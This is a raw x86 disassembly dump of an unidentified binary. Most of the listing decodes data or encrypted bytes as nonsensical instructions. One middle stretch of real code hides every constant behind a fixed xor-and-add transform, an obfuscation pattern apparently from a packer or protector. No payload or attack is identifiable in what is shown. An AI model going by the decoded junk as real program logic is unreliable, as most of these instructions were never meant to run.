  42602b:	aam    0xf2
  42602d:	int3   
  42602e:	in     al,dx
  42602f:	fistp  QWORD PTR [edx-0x2a450728]
  426035:	cmc    
  426036:	add    cl,dl
  426038:	aad    0xfd
  42603a:	pop    es
  42603b:	loop   0x426022
  42603d:	(bad)  
  426040:	fsqrt  
  426042:	repnz rcl cl,cl
  426045:	mov    ebp,0xcfc4f6f4
  42604a:	fcmovnb st,st(7)
  42604c:	ror    bh,1
  42604e:	aam    0xda
  426050:	cli    
  426051:	fsin   
  426053:	sar    DWORD PTR [eax-0x462344fb],cl
  426059:	aad    0xd6
  42605b:	aam    0xbd
  42605d:	jmp    0xf84d674c
  426062:	test   al,0xa6
  426064:	(bad)  
  426065:	in     eax,dx
  426066:	scas   eax,DWORD PTR es:[edi]
  426067:	scas   al,BYTE PTR es:[edi]
  426068:	out    0xfb,al
  42606a:	mov    ah,0xfb
  42606c:	aad    0xcc
  42606e:	aam    0xb5
  426070:	(bad)  
  426072:	ror    ch,cl
  426074:	out    0xf4,eax
  426076:	std    
  426077:	ret    0xfef4
  42607a:	add    ch,bl
  42607c:	leave  
  42607d:	out    dx,al
  42607e:	add    al,0x6
  426080:	les    ecx,FWORD PTR [ebx]
  426082:	jmp    0xc5063e4e
  426087:	in     al,0xcd
  426089:	stc    
  42608a:	jmp    0xfa185141
  42608f:	mov    esi,0xbad702ec
  426094:	in     al,dx
  426095:	cld    
  426096:	sti    
  426097:	mov    esp,0xdf0804f1
  42609c:	in     eax,0xe5
  42609e:	jmp    0xc1c5:0xcdcb12cf
  4260a5:	repnz (bad) 
  4260a7:	jecxz  0x426083
  4260a9:	shl    DWORD PTR [ebx-0x13322a3a],0xd4
  4260b0:	cmc    
  4260b1:	add    bh,ah
  4260b3:	(bad)  
  4260b4:	(bad)  
  4260b6:	loope  0x426093
  4260b8:	fcmovb st,st(5)
  4260ba:	rol    DWORD PTR [edx],1
  4260bc:	add    ecx,DWORD PTR [esi]
  4260be:	aad    0xd
  4260c0:	fisttp QWORD PTR [ebx]
  4260c2:	lods   eax,DWORD PTR ds:[esi]
  4260c3:	repz (bad) 
  4260c5:	out    dx,al
  4260c6:	jmp    0xf51c167f
  4260cb:	mov    ch,0xe7
  4260cd:	int3   
  4260ce:	jmp    0x4260aa
  4260d0:	fidiv  WORD PTR [edi+ebp*8-0x53ffd2c]
  4260d7:	repz fsubp st(3),st
  4260da:	(bad)  
  4260dc:	fisttp QWORD PTR [ebx]
  4260de:	or     eax,0xdefd0ad8
  4260e3:	in     al,dx
  4260e4:	in     eax,dx
  4260e5:	repz jecxz 0x4260d0
  4260e8:	into   
  4260e9:	icebp  
  4260ea:	out    dx,al
  4260eb:	cmc    
  4260ec:	cmc    
  4260ed:	mov    esi,0xecbdd6da
  4260f2:	shr    dh,1
  4260f4:	add    bh,al
  4260f6:	int3   
  4260f7:	out    0xd5,al
  4260f9:	clc    
  4260fa:	or     ch,ah
  4260fc:	fsub   st(1),st
  4260fe:	ret    
  4260ff:	jmp    0xc3334503
  426104:	rcl    esi,cl
  426106:	retf   
  426107:	repz retf 
  426109:	mov    ebx,0xcaf4f0d2
  42610e:	retf   
  42610f:	stc    
  426110:	repnz mov edx,0xfadbb8e0
  426116:	jecxz  0x42610d
  426118:	loop   0x4260fd
  42611a:	fst    st(6)
  42611c:	add    al,0xe
  42611e:	clc    
  42611f:	retf   0xfdc9
  426122:	in     al,0xc3
  426124:	jecxz  0x4260f4
  426126:	icebp  
  426127:	shr    eax,cl
  426129:	retf   0xffb9
  42612c:	push   ebx
  42612e:	(bad)  
  42612f:	out    dx,eax
  426130:	aad    0xc8
  426132:	enter  0xc3cc,0xb4
  426136:	(bad)  
  426138:	cmc    
  426139:	test   DWORD PTR [edx],0xc902fbe8
  42613f:	in     eax,0xec
  426141:	(bad)  
  426143:	icebp  
  426144:	mov    esp,0xcde5cacc
  426149:	xlat   BYTE PTR ds:[ebx]
  42614a:	out    0xf1,al
  42614c:	jmp    0x426114
  42614e:	iret   
  42614f:	(bad)  
  426151:	mov    esi,0xb4d5edd8
  426156:	in     al,dx
  426157:	rol    DWORD PTR [edi],0xd0
  42615a:	mov    edi,0xcfe7eff7
  42615f:	or     esp,ebx
  426161:	(bad)  
  426162:	fucom  st(5)
  426164:	jmp    0x426156
  426166:	mov    esp,0xf0d5c6ef
  42616b:	cli    
  42616c:	into   
  42616d:	mov    ah,0xdc
  42616f:	stc    
  426170:	aam    0xe9
  426172:	fsincos 
  426174:	clc    
  426175:	stc    
  426176:	cld    
  426177:	out    0xda,al
  426179:	(bad)  
  42617b:	xlat   BYTE PTR ds:[ebx]
  42617c:	leave  
  42617d:	psubusb mm7,mm5
  426180:	into   
  426181:	cli    
  426182:	mov    cl,0xb1
  426184:	neg    esp
  426186:	enter  0xdbdb,0xd1
  42618a:	cmc    
  42618b:	out    dx,eax
  42618c:	rcl    esi,1
  42618e:	fcmovnu st,st(6)
  426190:	fstp   st(7)
  426192:	lock cli 
  426194:	mov    ebp,0x2d3febc
  426199:	(bad)
  42619c:	out    0xd5,al
  42619e:	jmp    0xc7c1:0xe8e3c8e6
  4261a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261a6:	shl    ah,1
  4261a8:	xlat   BYTE PTR ds:[ebx]
  4261a9:	call   0xc01516a2
  4261ae:	(bad)  
  4261af:	std    
  4261b0:	jecxz  0x4261ad
  4261b2:	std    
  4261b3:	add    eax,DWORD PTR [ebx]
  4261b5:	ret    
  4261b6:	hlt    
  4261b7:	fdivr  st(4),st
  4261b9:	hlt    
  4261ba:	fucomi st,st(0)
  4261bc:	(bad)
  4261bf:	fucomip st,st(0)
  4261c1:	out    dx,al
  4261c2:	jmp    0x4261bb
  4261c4:	div    dh
  4261c6:	lock leave 
  4261c8:	lods   al,BYTE PTR ds:[esi]
  4261c9:	aad    0xe6
  4261cb:	fsubr  st,st(2)
  4261cd:	fpatan 
  4261cf:	cli    
  4261d0:	jecxz  0x42619a
  4261d2:	clc    
  4261d3:	out    dx,eax
  4261d4:	fdivp  st(6),st
  4261d6:	(bad)  
  4261d7:	aam    0xd8
  4261d9:	loop   0x4261e0
  4261db:	clc    
  4261dc:	fsubrp st(0),st
  4261de:	jmp    0x4261e2
  4261e0:	(bad)  
  4261e1:	(bad)  
  4261e2:	out    dx,al
  4261e3:	out    0xbd,eax
  4261e5:	iret   
  4261e6:	repz mov bl,0xbb
  4261e9:	jmp    0xec3a50e5
  4261ee:	mov    bh,0xd3
  4261f0:	jmp    0xdaf8:0xdab8b8d4
  4261f7:	aad    0x6
  4261f9:	icebp  
  4261fa:	loop   0x426203
  4261fc:	in     eax,0xd9
  4261fe:	(bad)  
  426200:	std    
  426201:	in     eax,dx
  426202:	mov    ecx,0xb6e2ced8
  426207:	stos   BYTE PTR es:[edi],al
  426208:	mov    dl,0xc5
  42620a:	sti    
  42620b:	jmp    0xc92020c0
  426210:	out    dx,al
  426211:	ret    0xf1e2
  426214:	repz clc 
  426216:	mov    esp,0xd9e4ec
  42621b:	add    eax,ebp
  42621d:	out    0xc5,al
  42621f:	out    dx,eax
  426220:	push   cs
  426221:	repz ret 
  426223:	lods   al,BYTE PTR ds:[esi]
  426224:	test   eax,0xe8b4d4ea
  426229:	rcl    cl,1
  42622b:	sar    eax,cl
  42622d:	out    dx,al
  42622e:	(bad)  
  426230:	enter  0xccd1,0xda
  426234:	out    0xf8,eax
  426236:	clc    
  426237:	add    eax,0xfde2fafe
  42623c:	iret   
  42623d:	into   
  42623e:	or     esi,edi
  426240:	or     bh,ah
  426242:	shl    bl,0xf3
  426245:	mov    al,0xd0
  426247:	enter  0xf0c3,0xe4
  42624b:	int    0xe9
  42624d:	cli    
  42624e:	retf   
  42624f:	jmp    0x42620f
  426251:	mov    esi,0xfc0102d1
  426256:	mov    edi,0xc1e1fad9
  42625b:	cli    
  42625c:	jmp    edx
  42625e:	(bad)  
  426260:	add    eax,0xa5b8c0fd
  426265:	out    dx,eax
  426266:	hlt    
  426267:	call   0xc0fe245d
  42626c:	(bad)  
  42626d:	leave  
  42626e:	(bad)
  426271:	mov    ecx,0xf8bfdae9
  426276:	lock cmc 
  426278:	sar    ecx,cl
  42627a:	pop    es
  42627b:	lds    eax,FWORD PTR [edi]
  42627d:	leave  
  42627e:	(bad)  
  426280:	retf   
  426281:	in     al,0xaa
  426283:	mov    ebp,0xe4f2f7d1
  426288:	repnz fcmovb st,st(4)
  42628b:	test   bh,0xb0
  42628e:	int3   
  42628f:	mov    dh,0xfe
  426291:	retf   0xc0bb
  426294:	div    BYTE PTR [edi+eax*1-0x35242026]
  42629b:	cli    
  42629c:	hlt    
  42629d:	aad    0xef
  42629f:	loopne 0x4262ad
  4262a1:	rol    dh,0xca
  4262a4:	out    0xc7,eax
  4262a6:	scas   al,BYTE PTR es:[edi]
  4262a7:	mov    bl,0xf9
  4262aa:	in     eax,dx
  4262ab:	loopne 0x42629f
  4262ad:	cmc    
  4262ae:	fdivr  QWORD PTR [edx+edx*8+0xf6d5ca]
  4262b5:	out    dx,al
  4262b6:	(bad)  
  4262b7:	cli    
  4262b8:	mov    ecx,0xdac5d903
  4262bd:	fadd   QWORD PTR [edx]
  4262bf:	fldln2 
  4262c1:	adc    ebx,ebp
  4262c3:	shl    BYTE PTR [edi-0xf140a15],0xd7
  4262ca:	scas   eax,DWORD PTR es:[edi]
  4262cb:	mov    ebx,0xdafbd9ba
  4262d0:	repnz add edx,esi
  4262d3:	(bad)  
  4262d4:	mov    ebp,0xe3c004da
  4262d9:	(bad)  
  4262da:	(bad)  
  4262db:	add    eax,0xe5cbc8f9
  4262e0:	loopne 0x4262cf
  4262e2:	mov    ecx,0xb6bceab0
  4262e7:	icebp  
  4262e8:	(bad)
  4262eb:	mov    ah,0xf1
  4262ed:	rcr    edx,cl
  4262ef:	jmp    0xd5dc:0xf9edf0e3
  4262f6:	lock add ebx,edi
  4262f9:	(bad)  
  4262fa:	jmp    0xc4727d6
  4262ff:	sti    
  426300:	jmp    0xb1c0:0xd3a8d305
  426307:	sti    
  426308:	retf   
  426309:	stc    
  42630a:	fcmovbe st,st(1)
  42630c:	stc    
  42630d:	stc    
  42630e:	retf   
  42630f:	in     al,0xf1
  426311:	fdiv   st(5),st
  426313:	iret   
  426314:	imul   ah
  426316:	mov    ebx,0xc2dac5d9
  42631b:	jecxz  0x4262de
  42631d:	pop    es
  42631e:	add    cl,BYTE PTR [eax+ebp*8]
  426321:	(bad)
  426325:	out    dx,al
  426326:	in     eax,dx
  426327:	stos   BYTE PTR es:[edi],al
  426328:	mov    al,0xef
  42632a:	jmp    0xc8f3:0xfbacf4f1
  426331:	ror    edi,1
  426333:	(bad)  
  426334:	in     eax,dx
  426335:	cld    
  426336:	mov    esi,0xf1e000fe
  42633b:	bswap  edx
  42633d:	loopne 0x426304
  42633f:	fmul   st(5),st
  426341:	jmp    0xea05210f
  426346:	(bad)  
  426347:	rol    ebp,1
  426349:	jmp    0xfbcb:0xfdc8cfe9
  426350:	(bad)  
  426351:	fcmovu st,st(5)
  426353:	out    0xd5,eax
  426355:	ret    0xc7f5
  426358:	ror    DWORD PTR [edx],cl
  42635a:	(bad)  
  42635b:	fsubr  st(5),st
  42635d:	out    dx,al
  42635e:	jmp    0x426325
  426360:	add    esi,esp
  426362:	rcl    edi,cl
  426364:	jmp    0x426357
  426366:	mov    dl,0xd4
  426368:	int    0xe5
  42636a:	mov    al,0xc4
  42636c:	jmp    0x42636c
  42636e:	jmp    0xf43c605b
  426373:	mov    dh,0xef
  426375:	rol    al,cl
  426377:	fsub   st,st(6)
  426379:	add    eax,0xf6e7eaf8
  42637e:	retf   
  42637f:	loopne 0x42634b
  426381:	in     eax,0xc4
  426383:	out    dx,al
  426384:	call   0xc8283974
  426389:	mov    bh,0xb6
  42638b:	mov    ch,0xdf
  42638d:	mov    esi,0xe903ebd5
  426392:	fcom   st(4)
  426394:	(bad)  
  426395:	in     eax,dx
  426396:	in     eax,dx
  426397:	mov    ebp,0xe9bff6f5
  42639c:	fiadd  WORD PTR [eax]
  42639e:	add    eax,0xe6eedbc2
  4263a3:	fidiv  WORD PTR [eax-0x294b3f0b]
  4263a9:	aad    0xcf
  4263ab:	ror    dl,0xfe
  4263ae:	leave  
  4263af:	jecxz  0x42638e
  4263b1:	fucomp st(0)
  4263b3:	int    0xd4
  4263b5:	in     eax,0xcd
  4263b7:	(bad)  
  4263b8:	jmp    0x8da:0xfbd0d7ea
  4263bf:	ret    0x6da
  4263c2:	in     al,0xbf
  4263c4:	in     al,dx
  4263c5:	(bad)  
  4263c7:	mov    al,0xf3
  4263c9:	(bad)  
  4263cb:	(bad)  
  4263cc:	repnz mov eax,0xbecae3cd
  4263d2:	fidiv  DWORD PTR [esi-0x33241a1e]
  4263d8:	shr    cl,0xfe
  4263db:	call   0xfa0e3fb7
  4263e0:	std    
  4263e1:	(bad)  
  4263e3:	ret    
  4263e4:	jmp    0xdac6:0xd5c6e4f7
  4263eb:	out    0xd9,eax
  4263ed:	mov    eax,0xded5bcfb
  4263f2:	ror    eax,1
  4263f4:	out    0xd6,eax
  4263f6:	cmc    
  4263f7:	xlat   BYTE PTR ds:[ebx]
  4263f8:	idiv   edx
  4263fa:	fld    st(6)
  4263fc:	shl    eax,0xa
  4263ff:	add    eax,0xa6dce5dd
  426404:	leave  
  426405:	lock loope 0x4263dd
  426408:	shl    dh,1
  42640a:	cmc    
  42640b:	(bad)  
  42640c:	mov    bh,0xf7
  42640e:	rol    BYTE PTR [ebx],cl
  426410:	mov    ch,0xd7
  426412:	into   
  426413:	fmul   st,st(7)
  426415:	into   
  426416:	(bad)  
  426418:	rcr    dh,0xd9
  42641b:	add    al,0xa
  42641d:	or     eax,0xc909fc0b
  426422:	(bad)  
  426423:	rol    bl,cl
  426425:	mov    cl,0xcf
  426427:	leave  
  426428:	mov    al,0xf2
  42642a:	mov    ah,0xcc
  42642c:	hlt    
  42642d:	(bad)  
  42642e:	(bad)  
  42642f:	in     al,0xcb
  426431:	iret   
  426432:	fsubr  st(3),st
  426434:	loop   0x426407
  426436:	fdivr  st(0),st
  426438:	shl    esi,0x2
  42643b:	leave  
  42643c:	fcmovne st,st(0)
  42643e:	hlt    
  42643f:	or     ecx,DWORD PTR [edx]
  426441:	or     al,0xcc
  426443:	in     eax,dx
  426444:	leave  
  426445:	shr    DWORD PTR [ebp-0x131a2d3a],0xf8
  42644c:	mov    dh,0xc8
  42644e:	idiv   DWORD PTR [edi-0x1f090944]
  426454:	add    esp,eax
  426456:	rcl    esi,1
  426458:	add    edi,eax
  42645a:	add    al,0xfa
  42645c:	jmp    0xe6c0:0xdc00f5c8
  426463:	int    0xbe
  426465:	loopne 0x426414
  426467:	call   0xcffa4f3a
  42646c:	aad    0xb6
  42646e:	call   0xbefb285c
  426473:	fnstsw WORD PTR [ecx-0x3a282125]
  426479:	hlt    
  42647a:	or     DWORD PTR [edx],ecx
  42647c:	fyl2xp1 
  42647e:	les    ecx,FWORD PTR [eax]
  426480:	jmp    0xe6cc:0xeecfc907
  426487:	cmc    
  426488:	rol    edi,cl
  42648a:	retf   
  42648b:	mov    ah,0xf2
  42648d:	mov    ecx,0xd6e8bbfb
  426492:	(bad)  
  426493:	mov    esi,0xd805f3be
  426498:	or     edx,ecx
  42649a:	sub    eax,0x3272fb
  42649f:	xor    eax,0x75108b5
  4264a4:	cmp    eax,0xf89ca5b0
  4264a9:	je     0x42b03e
  4264af:	mov    eax,DWORD PTR [ebp-0x8]
  4264b2:	add    eax,DWORD PTR [ebp-0x80]
  4264b5:	mov    DWORD PTR [ebp-0x84],eax
  4264bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4264be:	sub    eax,DWORD PTR [ebp-0x80]
  4264c1:	mov    DWORD PTR [ebp-0x88],eax
  4264c7:	mov    eax,DWORD PTR [ebp-0x88]
  4264cd:	mov    DWORD PTR [ebp-0x19c],eax
  4264d3:	mov    eax,DWORD PTR [ebp-0x84]
  4264d9:	mov    DWORD PTR [ebp-0x198],eax
  4264df:	mov    DWORD PTR [ebp-0x150],0xf89c85b0
  4264e9:	mov    DWORD PTR [ebp-0x154],0xf89c85b3
  4264f3:	mov    eax,DWORD PTR [ebp-0x150]
  4264f9:	xor    eax,0x75108b5
  4264fe:	add    eax,0x3272fb
  426503:	mov    DWORD PTR [ebp-0x144],eax
  426509:	mov    eax,DWORD PTR [ebp-0x150]
  42650f:	xor    eax,0x75108b5
  426514:	add    eax,0x3272fb
  426519:	mov    DWORD PTR [ebp-0x148],eax
  42651f:	mov    DWORD PTR [ebp-0x14c],0xf89c8590
  426529:	mov    DWORD PTR [ebp-0x158],0xf89c85b9
  426533:	mov    eax,DWORD PTR [ebp-0x19c]
  426539:	mov    ecx,DWORD PTR [ebp-0x150]
  42653f:	xor    ecx,0x75108b5
  426545:	add    ecx,0x3272fb
  42654b:	cmp    eax,ecx
  42654d:	je     0x42b039
  426553:	mov    eax,DWORD PTR [ebp-0x154]
  426559:	xor    eax,0x75108b5
  42655e:	add    eax,0x3272fb
  426563:	mov    ecx,DWORD PTR [ebp-0x144]
  426569:	imul   ecx,eax
  42656c:	mov    eax,DWORD PTR [ebp-0x154]
  426572:	xor    eax,0x75108b5
  426577:	add    eax,0x3272fb
  42657c:	mov    edx,DWORD PTR [ebp-0x19c]
  426582:	sub    edx,eax
  426584:	cmp    ecx,edx
  426586:	ja     0x42b039
  42658c:	mov    eax,DWORD PTR [ebp-0x19c]
  426592:	mov    ecx,DWORD PTR [ebp-0x144]
  426598:	sub    eax,ecx
  42659a:	mov    ecx,DWORD PTR [ebp-0x14c]
  4265a0:	xor    ecx,0x75108b5
  4265a6:	add    ecx,0x3272fb
  4265ac:	xor    edx,edx
  4265ae:	div    ecx
  4265b0:	mov    DWORD PTR [ebp-0x15c],eax
  4265b6:	mov    eax,DWORD PTR [ebp-0x15c]
  4265bc:	mov    ecx,DWORD PTR [ebp-0x158]
  4265c2:	xor    ecx,0x75108b5
  4265c8:	add    ecx,0x3272fb
  4265ce:	cmp    eax,ecx
  4265d0:	jbe    0x4265ec
  4265d6:	mov    eax,DWORD PTR [ebp-0x158]
  4265dc:	xor    eax,0x75108b5
  4265e1:	add    eax,0x3272fb
  4265e6:	mov    DWORD PTR [ebp-0x15c],eax
  4265ec:	mov    eax,DWORD PTR [ebp-0x14c]
  4265f2:	xor    eax,0x75108b5
  4265f7:	add    eax,0x3272fb
  4265fc:	mov    ecx,DWORD PTR [ebp-0x15c]
  426602:	imul   ecx,eax
  426605:	mov    DWORD PTR [ebp-0x148],ecx
  42660b:	mov    eax,DWORD PTR [ebp-0x148]
  426611:	mov    ecx,DWORD PTR [ebp-0x150]
  426617:	xor    ecx,0x75108b5
  42661d:	add    ecx,0x3272fb
  426623:	cmp    eax,ecx
  426625:	je     0x428c70
  42662b:	mov    eax,DWORD PTR [ebp-0x148]
  426631:	mov    DWORD PTR [ebp-0x194],eax
  426637:	mov    eax,DWORD PTR [ebp-0x198]
  42663d:	add    eax,DWORD PTR [ebp-0x144]
  426643:	mov    DWORD PTR [ebp-0x190],eax
  426649:	mov    DWORD PTR [ebp-0x17c],0xf89c85b0
  426653:	mov    DWORD PTR [ebp-0x184],0xf89c85b3
  42665d:	mov    DWORD PTR [ebp-0x170],0xf89c85b2
  426667:	mov    DWORD PTR [ebp-0x16c],0xf89c85bd
  426671:	mov    DWORD PTR [ebp-0x168],0xf89c85b3
  42667b:	mov    eax,DWORD PTR [ebp-0x17c]
  426681:	xor    eax,0x75108b5
  426686:	add    eax,0x3272fb
  42668b:	jmp    0x428a31
  426690:	ffreep st(2)
  426692:	sub    esi,DWORD PTR [esi+esi*1+0x3dd06474]
  426699:	xor    eax,0x62925692
  42669e:	dec    eax
  42669f:	shl    BYTE PTR [ebx-0x77],cl
  4266a2:	jns    0x42671f
  4266a4:	add    bl,BYTE PTR [eax-0x3e258485]
  4266aa:	in     eax,0xb
  4266ac:	retf   
  4266ad:	fucomip st,st(4)
  4266af:	out    dx,eax
  4266b0:	test   eax,0xc0ceaebe
  4266b5:	repnz mov dh,0xee
  4266b8:	repz mov ah,0xb7
  4266bb:	fprem  
  4266bd:	mov    ecx,0xf9fac8ee
  4266c2:	add    ebp,esp
  4266c4:	fsub   st,st(4)
  4266c6:	repz ror DWORD PTR [edx],0xfa
  4266ca:	(bad)  
  4266cb:	cld    
  4266cc:	or     dl,cl
  4266ce:	leave  
  4266cf:	add    eax,0xc2f6b2af
  4266d4:	leave  
  4266d5:	(bad)  
  4266d6:	repz (bad) 
  4266d8:	jmp    0xc8ce:0xf0dae8f6
  4266df:	(bad)  
  4266e0:	mov    ecx,0xbeecddc0
  4266e5:	icebp  
  4266e6:	add    eax,DWORD PTR [eax]
  4266e8:	(bad)  
  4266ea:	(bad)  
  4266eb:	(bad)  
  4266ed:	in     eax,0xc8
  4266ef:	repnz mov dl,0xcc
  4266f2:	mov    esi,0xd7ebeaf3
  4266f7:	lock leave 
  4266f9:	loopne 0x4266cc
  4266fb:	rcr    ah,1
  4266fd:	xlat   BYTE PTR ds:[ebx]
  4266fe:	clc    
  4266ff:	retf   0xf9df
  426702:	cld    
  426703:	mov    esp,0xd904d0bd
  426708:	add    ecx,DWORD PTR [edx]
  42670a:	out    dx,al
  42670b:	cld    
  42670c:	loopne 0x42671b
  42670e:	loopne 0x42671e
  426710:	shr    ebp,cl
  426712:	test   eax,0xadbcd3ed
  426717:	aad    0xd8
  426719:	cli    
  42671a:	into   
  42671b:	(bad)  
  42671d:	icebp  
  42671e:	lock lock test dl,0xe7
  426723:	cli    
  426724:	cmc    
  426725:	faddp  st(5),st
  426727:	ror    BYTE PTR [ecx],cl
  426729:	cli    
  42672a:	or     esi,ebp
  42672c:	add    DWORD PTR ds:0xc4eee600,eax
  426732:	(bad)  
  426733:	rcl    ah,1
  426735:	leave  
  426736:	(bad)  
  426737:	mov    dl,0xe4
  426739:	in     al,dx
  42673a:	into   
  42673b:	retf   
  42673c:	(bad)  
  42673e:	shl    edx,1
  426740:	add    bl,dh
  426742:	out    dx,al
  426743:	(bad)  
  426744:	clc    
  426745:	out    0xf4,eax
  426747:	mov    esp,0xca07dfe0
  42674c:	aad    0xe1
  42674e:	out    dx,eax
  42674f:	leave  
  426750:	jecxz  0x426738
  426752:	rcr    esp,1
  426754:	hlt    
  426755:	icebp  
  426756:	mov    ch,0xf9
  426758:	scas   eax,DWORD PTR es:[edi]
  426759:	mov    ah,0xc7
  42675b:	mov    al,0xf5
  42675d:	mov    dh,0xfd
  42675f:	cld    
  426760:	not    ebx
  426762:	mul    eax
  426764:	cmc    
  426765:	add    esp,edx
  426767:	add    edx,ebp
  426769:	(bad)
  42676c:	leave  
  42676d:	int    0xd
  42676f:	loopne 0x42673b
  426771:	scas   eax,DWORD PTR es:[edi]
  426772:	leave  
  426773:	into   
  426774:	repnz loop 0x426749
  426777:	enter  0xf2d3,0xca
  42677b:	rcl    ebx,cl
  42677d:	cmc    
  42677e:	out    dx,al
  42677f:	in     eax,dx
  426780:	ret    0xf5fa
  426783:	(bad)  
  426784:	aad    0xfa
  426786:	(bad)  
  426788:	fiadd  DWORD PTR [eax]
  42678a:	test   ebx,0xfe4cbd9
  426790:	jmp    0x426779
  426792:	ror    esp,0xf5
  426795:	aad    0xf1
  426797:	loopne 0x426753
  426799:	out    dx,eax
  42679a:	out    0xc8,al
  42679c:	retf   
  42679d:	mov    dh,0xbd
  42679f:	jmp    0xff3b4b83
  4267a4:	cld    
  4267a5:	or     esi,ebp
  4267a7:	jmp    0xf0183896
  4267ac:	in     eax,dx
  4267ad:	jmp    0x426793
  4267af:	call   0xe10d4f85
  4267b4:	ret    
  4267b5:	loopne 0x426760
  4267b7:	repnz mov edx,0xffebeccd
  4267bd:	shl    ebp,cl
  4267bf:	int3   
  4267c0:	repz lock loopne 0x4267aa
  4267c4:	cld    
  4267c5:	not    bh
  4267c7:	out    0xfd,eax
  4267c9:	std    
  4267ca:	fmul   st,st(2)
  4267cc:	or     al,0x9
  4267ce:	out    dx,al
  4267cf:	jmp    0xb0391890
  4267d4:	leave  
  4267d5:	rol    bh,0xe1
  4267d8:	loope  0x42678f
  4267da:	shl    ch,1
  4267dc:	fucomip st,st(4)
  4267de:	into   
  4267df:	fidivr WORD PTR [ebp-0x390e4308]
  4267e5:	mov    ebp,0x1e5dbd0
  4267ea:	or     cl,BYTE PTR [ecx]
  4267ec:	ret    
  4267ed:	loop   0x4267d1
  4267ef:	into   
  4267f0:	in     al,0xb0
  4267f2:	in     eax,0xcb
  4267f4:	aam    0xfb
  4267f6:	loopne 0x4267f3
  4267f8:	in     al,0xed
  4267fa:	icebp  
  4267fb:	mov    ch,0xea
  4267fd:	leave  
  4267fe:	mul    bl
  426800:	repz (bad) 
  426803:	add    eax,DWORD PTR [ebx]
  426805:	mov    ebp,0xe9e5d9c6
  42680a:	in     al,0x2
  42680c:	iret   
  42680d:	int3   
  42680e:	or     esp,edi
  426810:	les    esi,FWORD PTR [edx-0x344c151f]
  426816:	cli    
  426817:	mov    al,0xec
  426819:	(bad)  
  42681a:	hlt    
  42681b:	aam    0xb4
  42681d:	mov    dl,0xbb
  42681f:	call   esi
  426821:	int    0x1
  426823:	fld    DWORD PTR ds:0xf1d6fcd2
  426829:	std    
  42682a:	add    eax,edi
  42682c:	fneni(8087 only) 
  42682e:	retf   
  42682f:	in     eax,0xa8
  426831:	scas   al,BYTE PTR es:[edi]
  426832:	loop   0x4267fc
  426834:	out    0xce,eax
  426836:	fcmovnbe st,st(3)
  426838:	mov    bl,0xd5
  42683a:	fcmove st,st(5)
  42683c:	fcom   st(7)
  42683e:	rol    dl,cl
  426840:	cli    
  426841:	(bad)  
  426843:	int    0xec
  426845:	ret    0xffc5
  426848:	(bad)  
  426849:	out    0x2,al
  42684b:	(bad)  
  42684d:	out    0xd9,eax
  42684f:	or     dl,bl
  426851:	test   eax,0xdbf2beb7
  426856:	loope  0x42680d
  426858:	in     eax,0xb5
  42685a:	out    0xe4,al
  42685c:	out    dx,eax
  42685d:	out    dx,al
  42685e:	mov    edx,0xf6f5e0e3
  426863:	jecxz  0x426848
  426865:	test   ebx,0xe0fffbd1
  42686b:	push   es
  42686c:	add    al,0xcd
  42686e:	int    0xee
  426870:	ror    esi,cl
  426872:	shr    BYTE PTR [ebp-0x341b5324],1
  426878:	int3   
  426879:	aad    0xd3
  42687b:	in     eax,dx
  42687c:	std    
  42687d:	aam    0xed
  42687f:	aad    0xbf
  426881:	clc    
  426882:	int    0xb8
  426884:	rol    dl,1
  426886:	xlat   BYTE PTR ds:[ebx]
  426887:	hlt    
  426888:	aam    0x0
  42688a:	add    ah,al
  42688c:	out    dx,al
  42688d:	or     eax,0xb8b8e9f2
  426892:	test   eax,0xd2e0dbd3
  426898:	(bad)  
  426899:	clc    
  42689a:	aad    0xf1
  42689c:	mov    edi,0xe2e8b1f2
  4268a1:	pop    es
  4268a2:	neg    edi
  4268a4:	rol    eax,1
  4268a6:	add    eax,0xe1d8f402
  4268ab:	fsubr  st(0),st
  4268ad:	jmp    0xb92664c5
  4268b2:	out    dx,eax
  4268b3:	lock loop 0x4268ac
  4268b6:	jmp    0xc9c4:0xedd1d3ee
  4268bd:	rcl    cl,1
  4268bf:	jmp    0xf8cd:0xd8d2d5c9
  4268c6:	div    ecx
  4268c8:	fdiv   st,st(7)
  4268ca:	(bad)  
  4268cb:	cld    
  4268cc:	(bad)  
  4268cd:	jecxz  0x426890
  4268cf:	add    BYTE PTR [ebp-0x3b1b330e],ch
  4268d5:	retf   0xecc7
  4268d8:	retf   0xb0b7
  4268db:	clc    
  4268dc:	dec    bh
  4268de:	mul    edx
  4268e0:	aad    0xfc
  4268e2:	rcr    ebx,cl
  4268e4:	idiv   BYTE PTR [esi+0x5cae4fc]
  4268ea:	jmp    0x52d41cf
  4268ef:	fidivr DWORD PTR [esi-0x221e0f44]
  4268f5:	sti    
  4268f6:	(bad)  
  4268f7:	in     al,dx
  4268f8:	shl    BYTE PTR [eax-0x2e0e0732],0xb8
  4268ff:	(bad)  
  426901:	ret    0xd6d9
  426904:	fndisi(8087 only) 
  426906:	les    eax,FWORD PTR [edi]
  426908:	jmp    0x426915
  42690a:	ror    edi,0xc7
  42690d:	jmp    0xc30d41db
  426912:	out    dx,eax
  426913:	into   
  426914:	jmp    0x4268df
  426916:	rol    ch,0xb9
  426919:	(bad)  
  42691a:	icebp  
  42691b:	in     al,dx
  42691c:	(bad)  
  42691d:	mov    edx,0xbcba01bc
  426922:	call   esi
  426924:	fsubr  st(2),st
  426926:	add    bl,ch
  426928:	out    0xea,eax
  42692a:	std    
  42692b:	in     al,0xf5
  42692d:	add    BYTE PTR [edi],al
  42692f:	pop    es
  426930:	lods   al,BYTE PTR ds:[esi]
  426931:	mov    edi,0xc3ceedc0
  426936:	jecxz  0x42692e
  426938:	mov    al,0xc6
  42693a:	dec    ebx
  42693c:	hlt    
  42693d:	mov    ecx,0xbad1f9ee
  426942:	sti    
  426943:	inc    DWORD PTR [esi]
  426945:	std    
  426946:	mul    ch
  426948:	add    al,0xd4
  42694a:	or     ecx,ecx
  42694c:	or     esp,ebp
  42694e:	fucom  st(6)
  426950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426951:	out    dx,al
  426952:	jmp    0xe4d2:0xf5eecacf
  426959:	iret   
  42695a:	fcmovnb st,st(5)
  42695c:	in     eax,dx
  42695d:	sar    al,1
  42695f:	retf   0xecc3
  426962:	aam    0xbf
  426964:	hlt    
  426965:	aad    0xe5
  426967:	loope  0x426952
  426969:	fadd   st,st(4)
  42696b:	cmc    
  42696c:	or     cl,dl
  42696e:	int    0xe5
  426970:	test   eax,0xcbb2f2c3
  426975:	rol    bh,1
